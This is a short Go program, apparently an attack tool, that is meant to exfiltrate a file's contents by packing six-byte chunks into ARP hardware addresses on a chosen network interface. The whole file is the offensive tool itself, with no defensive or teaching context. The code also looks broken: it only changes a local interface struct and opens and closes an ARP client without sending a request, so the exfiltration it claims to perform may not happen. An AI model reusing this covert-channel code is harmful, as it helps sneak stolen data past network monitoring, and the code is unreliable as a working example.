// data exfiltration thru ARP hwaddr
// go get && go build
package main

import (
    "os"
    "fmt"
    "net"
    "github.com/mdlayher/arp"
)

var (
    err error
)

func bail(f string, d interface{}) {
    fmt.Fprintf(os.Stderr, f, d)
    os.Exit(1)
}

func main() {
    var iface net.Interface

    if len(os.Args) < 3 {
        bail("%v <iface> <file>\n", os.Args[0])
    }

    iface_name := os.Args[1]
    filename := os.Args[2]

    ifaces,_ := net.Interfaces()
    for _,iface = range ifaces {
        if iface.Name == iface_name {
            break
        } else {
            iface = net.Interface{}
        }
    }
    if iface.Name == "" {
        bail("interface %v not found.\n", iface_name)
    }

    fd, err := os.OpenFile(filename, os.O_RDONLY, 0)
    if err != nil {
        bail("%v\n", err)
    }
    defer fd.Close()

    var n int = 1
    for n != 0 {
        data := make([]byte, 6)
        n, err = fd.Read(data)
        if err != nil {
            bail("%v\n", err)
        }
        // generate hw address
        hwaddr := net.HardwareAddr{
            data[0], data[1], data[2],
            data[3], data[4], data[5],
        }

        iface.HardwareAddr = hwaddr
        client,_ := arp.Dial(&iface)
        client.Close()
    }
}
